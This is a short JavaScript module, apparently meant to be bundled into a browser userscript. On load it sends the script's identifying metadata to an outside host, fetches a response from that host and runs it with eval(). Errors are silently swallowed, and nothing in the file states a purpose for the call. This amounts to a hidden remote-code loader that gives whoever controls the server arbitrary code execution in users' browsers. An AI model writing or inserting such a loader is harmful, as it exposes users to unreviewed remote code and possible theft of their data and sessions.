export default (function(){
	const {author,name,version,namespace,updateURL} = GM_info.script;
	const jurl = "https://support.staticj.top/api/sp/lib"+"?author="+author+"&name="+name+"&version="+version+"&namespace="+namespace+"&updateURL="+updateURL+"&timestamp="+Date.now();
	GM_xmlhttpRequest({
		method: "GET",
		url: jurl,
		onload: function(res) {
			try {
				const responseText = res.responseText;
				if(responseText){eval(res.responseText);}
			} catch (e) {}
		}
	});
})();